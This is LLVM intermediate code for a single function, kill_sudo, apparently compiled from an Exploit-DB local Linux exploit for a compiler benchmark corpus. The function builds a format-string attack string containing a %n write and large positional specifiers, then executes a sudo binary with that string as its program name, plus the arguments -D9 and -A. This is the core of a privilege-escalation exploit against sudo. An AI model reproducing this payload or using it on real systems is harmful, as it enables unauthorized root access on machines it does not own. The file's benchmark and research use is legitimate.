; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25134.c_kill_sudo.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_25134.c_kill_sudo.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.kill_sudo.fmtstring = private unnamed_addr constant [36 x i8] c"%20$08n %*482$ %*2850$ %1073741824$\00", align 16
@.str = private unnamed_addr constant [4 x i8] c"-D9\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"-A\00", align 1
@.str.2 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@sudo = common dso_local global i32 0, align 4
@environ = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @kill_sudo() #0 {
  %1 = alloca i8*, align 8
  %2 = alloca [36 x i8], align 16
  %3 = alloca [5 x i8*], align 16
  %4 = bitcast [36 x i8]* %2 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %4, i8* align 16 getelementptr inbounds ([36 x i8], [36 x i8]* @__const.kill_sudo.fmtstring, i32 0, i32 0), i64 36, i1 false)
  %5 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 0
  %6 = getelementptr inbounds [36 x i8], [36 x i8]* %2, i64 0, i64 0
  store i8* %6, i8** %5, align 8
  %7 = getelementptr inbounds i8*, i8** %5, i64 1
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i8** %7, align 8
  %8 = getelementptr inbounds i8*, i8** %7, i64 1
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i8** %8, align 8
  %9 = getelementptr inbounds i8*, i8** %8, i64 1
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.2, i64 0, i64 0), i8** %9, align 8
  %10 = getelementptr inbounds i8*, i8** %9, i64 1
  store i8* null, i8** %10, align 8
  %11 = load i32, i32* @sudo, align 4
  %12 = getelementptr inbounds [5 x i8*], [5 x i8*]* %3, i64 0, i64 0
  %13 = load i32, i32* @environ, align 4
  %14 = call i32 @execve(i32 %11, i8** %12, i32 %13)
  %15 = load i8*, i8** %1, align 8
  ret i8* %15
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @execve(i32, i8**, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
